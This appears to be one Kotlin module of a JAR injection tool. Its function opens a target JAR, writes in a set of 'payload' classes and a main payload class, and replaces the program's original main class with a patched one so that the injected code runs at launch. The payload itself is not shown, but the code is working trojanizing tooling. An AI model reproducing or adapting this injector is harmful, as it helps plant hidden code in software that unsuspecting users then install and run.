package com.tmquan2508.inject.injector.modules

import com.tmquan2508.inject.cli.Logs
import java.nio.file.FileSystems
import java.nio.file.Files
import java.nio.file.Path

internal fun assembleFinalJar(
    jarPath: Path,
    modifiedMainClassBytes: ByteArray,
    mainClassPath: String,
    processedPayload: ProcessedPayload
) {
    FileSystems.newFileSystem(jarPath).use { fs ->
        val totalPayloadClasses = processedPayload.otherClasses.size + 1
        Logs.info(" -> Injecting $totalPayloadClasses payload classes...")

        processedPayload.otherClasses.forEach { otherClass ->
            val pathInJar = fs.getPath(otherClass.name + ".class")
            pathInJar.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
            Files.write(pathInJar, otherClass.compile())
        }

        Logs.debug("  -> Writing main payload class: ${processedPayload.finalMainPayloadName}")
        val mainPayloadPathInJar = fs.getPath(processedPayload.finalMainPayloadName + ".class")
        mainPayloadPathInJar.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
        Files.write(mainPayloadPathInJar, processedPayload.finalMainPayloadBytes)

        Logs.info(" -> Replacing original main class with patched version...")
        val mainClassPathInJar = fs.getPath(mainClassPath)
        Files.write(mainClassPathInJar, modifiedMainClassBytes)
    }
}